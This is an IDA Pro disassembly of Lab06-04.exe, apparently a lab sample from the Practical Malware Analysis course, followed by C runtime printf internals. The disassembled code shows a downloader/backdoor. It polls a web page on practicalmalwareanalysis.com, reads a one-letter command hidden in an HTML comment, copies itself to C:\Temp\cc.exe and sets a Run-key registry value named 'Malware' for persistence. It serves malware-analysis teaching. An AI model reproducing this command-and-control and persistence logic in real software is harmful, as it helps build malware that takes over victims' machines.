;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	      Copyright	(c) 2015 Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B25B-72D4-FF			    |
; |				MICC West Point				    |
; +-------------------------------------------------------------------------+
;
; Input	SHA256 : CCE96E5CB884C565C75960C41F53A7B56CEF1A3FF5B9893CD81C390FD0C35EF3
; Input	MD5    : 21BE74DFAFDACAAAB1C8D836E2186A69
; Input	CRC32  : 43393CD4

; File Name   :	V:\Shared\courses\PracticalMalwareAnalysis\Labs\BinaryCollection\Chapter_6L\Lab06-04.exe
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Timestamp   :	4D4B4A80 (Fri Feb 04 00:38:24 2011)
; Section 1. (virtual address 00001000)
; Virtual size			: 00004BFA (  19450.)
; Section size in file		: 00005000 (  20480.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401000	proc near		; CODE XREF: _main+6p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	0		; dwReserved
		push	0		; lpdwFlags
		call	ds:InternetGetConnectedState
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jz	short loc_40102B
		push	offset aSuccessInterne ; "Success: Internet Connection\n"
		call	sub_4012B5
		add	esp, 4
		mov	eax, 1
		jmp	short loc_40103A
; ---------------------------------------------------------------------------

loc_40102B:				; CODE XREF: sub_401000+15j
		push	offset aError1_1NoInte ; "Error	1.1: No	Internet\n"
		call	sub_4012B5
		add	esp, 4
		xor	eax, eax

loc_40103A:				; CODE XREF: sub_401000+29j
		mov	esp, ebp
		pop	ebp
		retn
sub_401000	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401040	proc near		; CODE XREF: _main+37p

Buffer		= byte ptr -230h
var_22F		= byte ptr -22Fh
var_22E		= byte ptr -22Eh
var_22D		= byte ptr -22Dh
var_22C		= byte ptr -22Ch
hFile		= dword	ptr -30h
hInternet	= dword	ptr -2Ch
szAgent		= byte ptr -28h
dwNumberOfBytesRead= dword ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 230h
		mov	eax, [ebp+arg_0]
		push	eax
		push	offset aInternetExplor ; "Internet Explorer 7.50/pma%d"
		lea	ecx, [ebp+szAgent]
		push	ecx		; char *
		call	_sprintf
		add	esp, 0Ch
		push	0		; dwFlags
		push	0		; lpszProxyBypass
		push	0		; lpszProxy
		push	0		; dwAccessType
		lea	edx, [ebp+szAgent]
		push	edx		; lpszAgent
		call	ds:InternetOpenA
		mov	[ebp+hInternet], eax
		push	0		; dwContext
		push	0		; dwFlags
		push	0		; dwHeadersLength
		push	0		; lpszHeaders
		push	offset szUrl	; "http://www.practicalmalwareanalysis.com"...
		mov	eax, [ebp+hInternet]
		push	eax		; hInternet
		call	ds:InternetOpenUrlA
		mov	[ebp+hFile], eax
		cmp	[ebp+hFile], 0
		jnz	short loc_4010B1
		push	offset aError2_1FailTo ; "Error	2.1: Fail to OpenUrl\n"
		call	sub_4012B5
		add	esp, 4
		mov	ecx, [ebp+hInternet]
		push	ecx		; hInternet
		call	ds:InternetCloseHandle
		xor	al, al
		jmp	loc_401140
; ---------------------------------------------------------------------------

loc_4010B1:				; CODE XREF: sub_401040+51j
		lea	edx, [ebp+dwNumberOfBytesRead]
		push	edx		; lpdwNumberOfBytesRead
		push	200h		; dwNumberOfBytesToRead
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	ecx, [ebp+hFile]
		push	ecx		; hFile
		call	ds:InternetReadFile
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jnz	short loc_4010F9
		push	offset aError2_2FailTo ; "Error	2.2: Fail to ReadFile\n"
		call	sub_4012B5
		add	esp, 4
		mov	edx, [ebp+hInternet]
		push	edx		; hInternet
		call	ds:InternetCloseHandle
		mov	eax, [ebp+hFile]
		push	eax		; hInternet
		call	ds:InternetCloseHandle
		xor	al, al
		jmp	short loc_401140
; ---------------------------------------------------------------------------

loc_4010F9:				; CODE XREF: sub_401040+92j
		movsx	ecx, [ebp+Buffer]
		cmp	ecx, 3Ch
		jnz	short loc_401131
		movsx	edx, [ebp+var_22F]
		cmp	edx, 21h
		jnz	short loc_401131
		movsx	eax, [ebp+var_22E]
		cmp	eax, 2Dh
		jnz	short loc_401131
		movsx	ecx, [ebp+var_22D]
		cmp	ecx, 2Dh
		jnz	short loc_401131
		mov	al, [ebp+var_22C]
		jmp	short loc_401140
; ---------------------------------------------------------------------------

loc_401131:				; CODE XREF: sub_401040+C3j
					; sub_401040+CFj ...
		push	offset aError2_3FailTo ; "Error	2.3: Fail to get command\n"
		call	sub_4012B5
		add	esp, 4
		xor	al, al

loc_401140:				; CODE XREF: sub_401040+6Cj
					; sub_401040+B7j ...
		mov	esp, ebp
		pop	ebp
		retn
sub_401040	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_401150(char, LPCSTR lpExistingFileName)
sub_401150	proc near		; CODE XREF: _main+6Ap

var_8		= dword	ptr -8
phkResult	= dword	ptr -4
arg_0		= byte ptr  8
lpExistingFileName= dword ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		movsx	eax, [ebp+arg_0]
		mov	[ebp+var_8], eax
		mov	ecx, [ebp+var_8]
		sub	ecx, 61h
		mov	[ebp+var_8], ecx
		cmp	[ebp+var_8], 4	; switch 5 cases
		ja	loc_401201	; jumptable 00401173 default case
		mov	edx, [ebp+var_8]
		jmp	ds:off_401212[edx*4] ; switch jump
; ---------------------------------------------------------------------------

loc_40117A:				; CODE XREF: sub_401150+23j
					; DATA XREF: .text:off_401212o
		push	0		; jumptable 00401173 case 0
		push	offset PathName	; "C:\\Temp"
		call	ds:CreateDirectoryA
		jmp	loc_40120E
; ---------------------------------------------------------------------------

loc_40118C:				; CODE XREF: sub_401150+23j
					; DATA XREF: .text:off_401212o
		push	1		; jumptable 00401173 case 1
		push	offset Data	; "C:\\Temp\\cc.exe"
		mov	eax, [ebp+lpExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		jmp	short loc_40120E
; ---------------------------------------------------------------------------

loc_40119F:				; CODE XREF: sub_401150+23j
					; DATA XREF: .text:off_401212o
		push	offset Data	; jumptable 00401173 case 2
		call	ds:DeleteFileA
		jmp	short loc_40120E
; ---------------------------------------------------------------------------

loc_4011AC:				; CODE XREF: sub_401150+23j
					; DATA XREF: .text:off_401212o
		lea	ecx, [ebp+phkResult] ; jumptable 00401173 case 3
		push	ecx		; phkResult
		push	0F003Fh		; samDesired
		push	0		; ulOptions
		push	offset SubKey	; "Software\\Microsoft\\Windows\\CurrentVe"...
		push	80000002h	; hKey
		call	ds:RegOpenKeyExA
		push	0Fh		; cbData
		push	offset Data	; "C:\\Temp\\cc.exe"
		push	1		; dwType
		push	0		; Reserved
		push	offset ValueName ; "Malware"
		mov	edx, [ebp+phkResult]
		push	edx		; hKey
		call	ds:RegSetValueExA
		test	eax, eax
		jz	short loc_4011F2
		push	offset aError3_1CouldN ; "Error	3.1: Could not set Registry value"...
		call	sub_4012B5
		add	esp, 4

loc_4011F2:				; CODE XREF: sub_401150+93j
		jmp	short loc_40120E
; ---------------------------------------------------------------------------

loc_4011F4:				; CODE XREF: sub_401150+23j
					; DATA XREF: .text:off_401212o
		push	186A0h		; jumptable 00401173 case 4
		call	ds:Sleep
		jmp	short loc_40120E
; ---------------------------------------------------------------------------

loc_401201:				; CODE XREF: sub_401150+1Aj
		push	offset aError3_2NotAVa ; jumptable 00401173 default case
		call	sub_4012B5
		add	esp, 4

loc_40120E:				; CODE XREF: sub_401150+37j
					; sub_401150+4Dj ...
		mov	esp, ebp
		pop	ebp
		retn
sub_401150	endp

; ---------------------------------------------------------------------------
off_401212	dd offset loc_40117A	; DATA XREF: sub_401150+23r
		dd offset loc_40118C	; jump table for switch	statement
		dd offset loc_40119F
		dd offset loc_4011AC
		dd offset loc_4011F4
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl main(int argc, const char	**argv,	const char **envp)
_main		proc near		; CODE XREF: start+AFp

var_C		= dword	ptr -0Ch
var_8		= byte ptr -8
var_4		= dword	ptr -4
argc		= dword	ptr  8
argv		= dword	ptr  0Ch
envp		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		call	sub_401000
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jnz	short loc_401248
		xor	eax, eax
		jmp	short loc_4012B1
; ---------------------------------------------------------------------------

loc_401248:				; CODE XREF: _main+12j
		mov	[ebp+var_C], 0
		jmp	short loc_40125A
; ---------------------------------------------------------------------------

loc_401251:				; CODE XREF: _main+7Dj
		mov	eax, [ebp+var_C]
		add	eax, 1
		mov	[ebp+var_C], eax

loc_40125A:				; CODE XREF: _main+1Fj
		cmp	[ebp+var_C], 5A0h
		jge	short loc_4012AF
		mov	ecx, [ebp+var_C]
		push	ecx
		call	sub_401040
		add	esp, 4
		mov	[ebp+var_8], al
		movsx	edx, [ebp+var_8]
		test	edx, edx
		jnz	short loc_40127E
		xor	eax, eax
		jmp	short loc_4012B1
; ---------------------------------------------------------------------------

loc_40127E:				; CODE XREF: _main+48j
		movsx	eax, [ebp+var_8]
		push	eax
		push	offset aSuccessParsedC ; "Success: Parsed command is %c\n"
		call	sub_4012B5
		add	esp, 8
		mov	ecx, [ebp+argv]
		mov	edx, [ecx]
		push	edx		; lpExistingFileName
		mov	al, [ebp+var_8]
		push	eax		; char
		call	sub_401150
		add	esp, 8
		push	0EA60h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_401251
; ---------------------------------------------------------------------------

loc_4012AF:				; CODE XREF: _main+31j
		xor	eax, eax

loc_4012B1:				; CODE XREF: _main+16j	_main+4Cj
		mov	esp, ebp
		pop	ebp
		retn
_main		endp


; =============== S U B	R O U T	I N E =======================================


sub_4012B5	proc near		; CODE XREF: sub_401000+1Cp
					; sub_401000+30p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebx
		push	esi
		mov	esi, offset stru_407210
		push	edi
		push	esi
		call	__stbuf
		mov	edi, eax
		lea	eax, [esp+10h+arg_4]
		push	eax		; int
		push	[esp+14h+arg_0]	; int
		push	esi		; FILE *
		call	sub_40152A
		push	esi
		push	edi
		mov	ebx, eax
		call	__ftbuf
		add	esp, 18h
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4012B5	endp

; [00000052 BYTES: COLLAPSED FUNCTION _sprintf.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [000000DF BYTES: COLLAPSED FUNCTION start. PRESS CTRL-NUMPAD+	TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS CTRL-NUMPAD+ TO EXPAND]
; ---------------------------------------------------------------------------
		pop	ecx
		pop	ecx
		retn
; [00000023 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000008D BYTES: COLLAPSED FUNCTION __stbuf. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION __ftbuf. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40152A(FILE *, int, int)
sub_40152A	proc near		; CODE XREF: sub_4012B5+1Ap
					; _sprintf+29p

var_24C		= byte ptr -24Ch
var_4D		= byte ptr -4Dh
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= byte ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
lpMem		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_16		= dword	ptr -16h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		xor	ecx, ecx
		push	edi
		mov	[ebp+var_10], ecx
		mov	bl, [esi]
		inc	esi
		test	bl, bl
		mov	[ebp+var_16+2],	ecx
		mov	[ebp+lpMem], ecx
		mov	[ebp+arg_4], esi
		jz	loc_401CA0
		mov	edi, 800h
		mov	edx, 200h
		jmp	short loc_40156B
; ---------------------------------------------------------------------------

loc_40155E:				; CODE XREF: sub_40152A+770j
		mov	ecx, [ebp+var_3C]
		mov	edx, 200h
		mov	edi, 800h

loc_40156B:				; CODE XREF: sub_40152A+32j
		cmp	[ebp+var_16+2],	0
		jl	loc_401CA0
		cmp	bl, 20h
		jl	short loc_40158D
		cmp	bl, 78h
		jg	short loc_40158D
		movsx	eax, bl
		mov	al, byte ptr ds:InternetReadFile[eax]
		and	eax, 0Fh
		jmp	short loc_40158F
; ---------------------------------------------------------------------------

loc_40158D:				; CODE XREF: sub_40152A+4Ej
					; sub_40152A+53j
		xor	eax, eax

loc_40158F:				; CODE XREF: sub_40152A+61j
		movsx	eax, ds:byte_4060F4[ecx+eax*8]
		sar	eax, 4
		cmp	eax, 7		; switch 8 cases
		mov	[ebp+var_3C], eax
		ja	loc_401C8F	; jumptable 004015A6 default case
		jmp	ds:off_401CA8[eax*4] ; switch jump
; ---------------------------------------------------------------------------

loc_4015AD:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		xor	eax, eax	; jumptable 004015A6 case 1
		or	[ebp+var_8], 0FFFFFFFFh
		mov	[ebp+var_40], eax
		mov	[ebp+var_38], eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_24], eax
		mov	[ebp+var_4], eax
		mov	[ebp+var_2C], eax
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4015CA:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		movsx	eax, bl		; jumptable 004015A6 case 2
		sub	eax, 20h
		jz	short loc_40160D
		sub	eax, 3
		jz	short loc_401604
		sub	eax, 8
		jz	short loc_4015FB
		dec	eax
		dec	eax
		jz	short loc_4015F2
		sub	eax, 3
		jnz	loc_401C8F	; jumptable 004015A6 default case
		or	[ebp+var_4], 8
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4015F2:				; CODE XREF: sub_40152A+B4j
		or	[ebp+var_4], 4
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4015FB:				; CODE XREF: sub_40152A+B0j
		or	[ebp+var_4], 1
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_401604:				; CODE XREF: sub_40152A+ABj
		or	byte ptr [ebp+var_4], 80h
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_40160D:				; CODE XREF: sub_40152A+A6j
		or	[ebp+var_4], 2
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_401616:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		cmp	bl, 2Ah		; jumptable 004015A6 case 3
		jnz	short loc_40163E
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int_arg
		test	eax, eax
		pop	ecx
		mov	[ebp+var_28], eax
		jge	loc_401C8F	; jumptable 004015A6 default case
		or	[ebp+var_4], 4
		neg	eax

loc_401636:				; CODE XREF: sub_40152A+121j
		mov	[ebp+var_28], eax
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_40163E:				; CODE XREF: sub_40152A+EFj
		mov	eax, [ebp+var_28]
		movsx	ecx, bl
		lea	eax, [eax+eax*4]
		lea	eax, [ecx+eax*2-30h]
		jmp	short loc_401636
; ---------------------------------------------------------------------------

loc_40164D:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		and	[ebp+var_8], 0	; jumptable 004015A6 case 4
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_401656:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		cmp	bl, 2Ah		; jumptable 004015A6 case 5
		jnz	short loc_401679
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int_arg
		test	eax, eax
		pop	ecx
		mov	[ebp+var_8], eax
		jge	loc_401C8F	; jumptable 004015A6 default case
		or	[ebp+var_8], 0FFFFFFFFh
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_401679:				; CODE XREF: sub_40152A+12Fj
		mov	eax, [ebp+var_8]
		movsx	ecx, bl
		lea	eax, [eax+eax*4]
		lea	eax, [ecx+eax*2-30h]
		mov	[ebp+var_8], eax
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_40168E:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		cmp	bl, 49h		; jumptable 004015A6 case 6
		jz	short loc_4016C0
		cmp	bl, 68h
		jz	short loc_4016B7
		cmp	bl, 6Ch
		jz	short loc_4016AE
		cmp	bl, 77h
		jnz	loc_401C8F	; jumptable 004015A6 default case
		or	[ebp+var_4], edi
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4016AE:				; CODE XREF: sub_40152A+171j
		or	[ebp+var_4], 10h
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4016B7:				; CODE XREF: sub_40152A+16Cj
		or	[ebp+var_4], 20h
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4016C0:				; CODE XREF: sub_40152A+167j
		cmp	byte ptr [esi],	36h
		jnz	short loc_4016D9
		cmp	byte ptr [esi+1], 34h
		jnz	short loc_4016D9
		inc	esi
		inc	esi
		or	byte ptr [ebp+var_4+1],	80h
		mov	[ebp+arg_4], esi
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_4016D9:				; CODE XREF: sub_40152A+199j
					; sub_40152A+19Fj
		and	[ebp+var_3C], 0

loc_4016DD:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		mov	ecx, off_4075C8	; jumptable 004015A6 case 0
		and	[ebp+var_2C], 0
		movzx	eax, bl
		test	byte ptr [ecx+eax*2+1],	80h
		jz	short loc_40170A
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		movsx	eax, bl
		push	eax		; int
		call	_write_char
		mov	bl, [esi]
		add	esp, 0Ch
		inc	esi
		mov	[ebp+arg_4], esi

loc_40170A:				; CODE XREF: sub_40152A+1C5j
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		movsx	eax, bl
		push	eax		; int
		call	_write_char
		add	esp, 0Ch
		jmp	loc_401C8F	; jumptable 004015A6 default case
; ---------------------------------------------------------------------------

loc_401722:				; CODE XREF: sub_40152A+7Cj
					; DATA XREF: .text:off_401CA8o
		movsx	eax, bl		; jumptable 004015A6 case 7
		cmp	eax, 67h
		jg	loc_401966
		cmp	eax, 65h
		jge	loc_4017CD
		cmp	eax, 58h
		jg	loc_40182C
		jz	loc_4019DA
		sub	eax, 43h
		jz	loc_4017F0
		dec	eax
		dec	eax
		jz	short loc_4017C3
		dec	eax
		dec	eax
		jz	short loc_4017C3
		sub	eax, 0Ch
		jnz	loc_401B7E
		test	word ptr [ebp+var_4], 830h
		jnz	short loc_40176B
		or	[ebp+var_4], edi

loc_40176B:				; CODE XREF: sub_40152A+23Cj
					; sub_40152A+45Bj
		cmp	[ebp+var_8], 0FFFFFFFFh
		mov	esi, 7FFFFFFFh
		jz	short loc_401779
		mov	esi, [ebp+var_8]

loc_401779:				; CODE XREF: sub_40152A+24Aj
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int_arg
		test	word ptr [ebp+var_4], 810h
		pop	ecx
		mov	ecx, eax
		mov	[ebp+var_C], ecx
		jz	loc_4019AE
		test	ecx, ecx
		jnz	short loc_4017A1
		mov	ecx, off_4071E8
		mov	[ebp+var_C], ecx

loc_4017A1:				; CODE XREF: sub_40152A+26Cj
		mov	[ebp+var_2C], 1
		mov	eax, ecx

loc_4017AA:				; CODE XREF: sub_40152A+297j
		mov	edx, esi
		dec	esi
		test	edx, edx
		jz	loc_4019A5
		cmp	word ptr [eax],	0
		jz	loc_4019A5
		inc	eax
		inc	eax
		jmp	short loc_4017AA
; ---------------------------------------------------------------------------

loc_4017C3:				; CODE XREF: sub_40152A+227j
					; sub_40152A+22Bj
		mov	[ebp+var_40], 1
		add	bl, 20h

loc_4017CD:				; CODE XREF: sub_40152A+207j
		or	[ebp+var_4], 40h
		cmp	[ebp+var_8], 0
		lea	edi, [ebp+var_24C]
		mov	[ebp+var_C], edi
		jge	loc_4018B1
		mov	[ebp+var_8], 6
		jmp	loc_4018F6
; ---------------------------------------------------------------------------

loc_4017F0:				; CODE XREF: sub_40152A+21Fj
		test	word ptr [ebp+var_4], 830h
		jnz	short loc_4017FB
		or	[ebp+var_4], edi

loc_4017FB:				; CODE XREF: sub_40152A+2CCj
					; sub_40152A+30Aj
		test	word ptr [ebp+var_4], 810h
		lea	eax, [ebp+arg_8]
		push	eax
		jz	short loc_401842
		call	_get_short_arg
		push	eax		; wchar_t
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		call	_wctomb
		add	esp, 0Ch
		mov	[ebp+var_10], eax
		test	eax, eax
		jge	short loc_401855
		mov	[ebp+var_38], 1
		jmp	short loc_401855
; ---------------------------------------------------------------------------

loc_40182C:				; CODE XREF: sub_40152A+210j
		sub	eax, 5Ah
		jz	short loc_401863
		sub	eax, 9
		jz	short loc_4017FB
		dec	eax
		jz	loc_401A3F
		jmp	loc_401B7E
; ---------------------------------------------------------------------------

loc_401842:				; CODE XREF: sub_40152A+2DBj
		call	_get_int_arg
		pop	ecx
		mov	[ebp+var_24C], al
		mov	[ebp+var_10], 1

loc_401855:				; CODE XREF: sub_40152A+2F7j
					; sub_40152A+300j
		lea	eax, [ebp+var_24C]
		mov	[ebp+var_C], eax
		jmp	loc_401B7E
; ---------------------------------------------------------------------------

loc_401863:				; CODE XREF: sub_40152A+305j
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int_arg
		test	eax, eax
		pop	ecx
		jz	short loc_4018A3
		mov	ecx, [eax+4]
		test	ecx, ecx
		jz	short loc_4018A3
		test	[ebp+var_4], edi
		jz	short loc_401894
		movsx	eax, word ptr [eax]
		shr	eax, 1
		mov	[ebp+var_C], ecx
		mov	[ebp+var_10], eax
		mov	[ebp+var_2C], 1
		jmp	loc_401B7E
; ---------------------------------------------------------------------------

loc_401894:				; CODE XREF: sub_40152A+351j
		and	[ebp+var_2C], 0
		mov	[ebp+var_C], ecx
		movsx	eax, word ptr [eax]
		jmp	loc_401B7B
; ---------------------------------------------------------------------------

loc_4018A3:				; CODE XREF: sub_40152A+345j
					; sub_40152A+34Cj
		mov	eax, off_4071E4
		mov	[ebp+var_C], eax
		push	eax		; char *
		jmp	loc_40195B
; ---------------------------------------------------------------------------

loc_4018B1:				; CODE XREF: sub_40152A+2B4j
		jnz	short loc_4018C1
		cmp	bl, 67h
		jnz	short loc_4018F6
		mov	[ebp+var_8], 1
		jmp	short loc_4018F6
; ---------------------------------------------------------------------------

loc_4018C1:				; CODE XREF: sub_40152A:loc_4018B1j
		cmp	[ebp+var_8], edx
		jle	short loc_4018C9
		mov	[ebp+var_8], edx

loc_4018C9:				; CODE XREF: sub_40152A+39Aj
		cmp	[ebp+var_8], 0A3h
		jle	short loc_4018F6
		mov	eax, [ebp+var_8]
		add	eax, 15Dh
		push	eax		; size_t
		call	_malloc
		test	eax, eax
		pop	ecx
		mov	[ebp+lpMem], eax
		jz	short loc_4018EF
		mov	edi, eax
		mov	[ebp+var_C], edi
		jmp	short loc_4018F6
; ---------------------------------------------------------------------------

loc_4018EF:				; CODE XREF: sub_40152A+3BCj
		mov	[ebp+var_8], 0A3h

loc_4018F6:				; CODE XREF: sub_40152A+2C1j
					; sub_40152A+38Cj ...
		mov	eax, [ebp+arg_8]
		push	[ebp+var_40]
		add	eax, 8
		mov	[ebp+arg_8], eax
		push	[ebp+var_8]
		mov	ecx, [eax-8]
		mov	[ebp+var_4C], ecx
		mov	eax, [eax-4]
		mov	[ebp+var_48], eax
		movsx	eax, bl
		push	eax
		lea	eax, [ebp+var_4C]
		push	edi
		push	eax
		call	off_4075B0
; ---------------------------------------------------------------------------
		mov	esi, [ebp+var_4]
		add	esp, 14h
		and	esi, 80h
		jz	short loc_40193C
		cmp	[ebp+var_8], 0
		jnz	short loc_40193C
		push	edi
		call	off_4075BC
; ---------------------------------------------------------------------------
		pop	ecx

loc_40193C:				; CODE XREF: sub_40152A+402j
					; sub_40152A+408j
		cmp	bl, 67h
		jnz	short loc_40194D
		test	esi, esi
		jnz	short loc_40194D
		push	edi
		call	off_4075B4
; ---------------------------------------------------------------------------
		pop	ecx

loc_40194D:				; CODE XREF: sub_40152A+415j
					; sub_40152A+419j
		cmp	byte ptr [edi],	2Dh
		jnz	short loc_40195A
		or	byte ptr [ebp+var_4+1],	1
		inc	edi
		mov	[ebp+var_C], edi

loc_40195A:				; CODE XREF: sub_40152A+426j
		push	edi		; char *

loc_40195B:				; CODE XREF: sub_40152A+382j
		call	_strlen
		pop	ecx
		jmp	loc_401B7B
; ---------------------------------------------------------------------------

loc_401966:				; CODE XREF: sub_40152A+1FEj
		sub	eax, 69h
		jz	loc_401A3F
		sub	eax, 5
		jz	loc_401A15
		dec	eax
		jz	loc_401A03
		dec	eax
		jz	short loc_4019D3
		sub	eax, 3
		jz	loc_40176B
		dec	eax
		dec	eax
		jz	loc_401A43
		sub	eax, 3
		jnz	loc_401B7E
		mov	[ebp+var_34], 27h
		jmp	short loc_4019E1
; ---------------------------------------------------------------------------

loc_4019A5:				; CODE XREF: sub_40152A+285j
					; sub_40152A+28Fj
		sub	eax, ecx
		sar	eax, 1
		jmp	loc_401B7B
; ---------------------------------------------------------------------------

loc_4019AE:				; CODE XREF: sub_40152A+264j
		test	ecx, ecx
		jnz	short loc_4019BB
		mov	ecx, off_4071E4
		mov	[ebp+var_C], ecx

loc_4019BB:				; CODE XREF: sub_40152A+486j
		mov	eax, ecx

loc_4019BD:				; CODE XREF: sub_40152A+4A0j
		mov	edx, esi
		dec	esi
		test	edx, edx
		jz	short loc_4019CC
		cmp	byte ptr [eax],	0
		jz	short loc_4019CC
		inc	eax
		jmp	short loc_4019BD
; ---------------------------------------------------------------------------

loc_4019CC:				; CODE XREF: sub_40152A+498j
					; sub_40152A+49Dj
		sub	eax, ecx
		jmp	loc_401B7B
; ---------------------------------------------------------------------------

loc_4019D3:				; CODE XREF: sub_40152A+456j
		mov	[ebp+var_8], 8

loc_4019DA:				; CODE XREF: sub_40152A+216j
		mov	[ebp+var_34], 7

loc_4019E1:				; CODE XREF: sub_40152A+479j
		test	byte ptr [ebp+var_4], 80h
		mov	[ebp+var_10], 10h
		jz	short loc_401A4A
		mov	al, byte ptr [ebp+var_34]
		mov	byte ptr [ebp+var_16], 30h
		add	al, 51h
		mov	[ebp+var_24], 2
		mov	byte ptr [ebp+var_16+1], al
		jmp	short loc_401A4A
; ---------------------------------------------------------------------------

loc_401A03:				; CODE XREF: sub_40152A+44Fj
		test	byte ptr [ebp+var_4], 80h
		mov	[ebp+var_10], 8
		jz	short loc_401A4A
		or	[ebp+var_4], edx
		jmp	short loc_401A4A
; ---------------------------------------------------------------------------

loc_401A15:				; CODE XREF: sub_40152A+448j
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int_arg
		test	byte ptr [ebp+var_4], 20h
		pop	ecx
		jz	short loc_401A2E
		mov	cx, word ptr [ebp+var_16+2]
		mov	[eax], cx
		jmp	short loc_401A33
; ---------------------------------------------------------------------------

loc_401A2E:				; CODE XREF: sub_40152A+4F9j
		mov	ecx, [ebp+var_16+2]
		mov	[eax], ecx

loc_401A33:				; CODE XREF: sub_40152A+502j
		mov	[ebp+var_38], 1
		jmp	loc_401C7C
; ---------------------------------------------------------------------------

loc_401A3F:				; CODE XREF: sub_40152A+30Dj
					; sub_40152A+43Fj
		or	[ebp+var_4], 40h

loc_401A43:				; CODE XREF: sub_40152A+463j
		mov	[ebp+var_10], 0Ah

loc_401A4A:				; CODE XREF: sub_40152A+4C2j
					; sub_40152A+4D7j ...
		test	byte ptr [ebp+var_4+1],	80h
		jz	short loc_401A5C
		lea	eax, [ebp+arg_8]
		push	eax
		call	_get_int64_arg
		pop	ecx
		jmp	short loc_401A9D
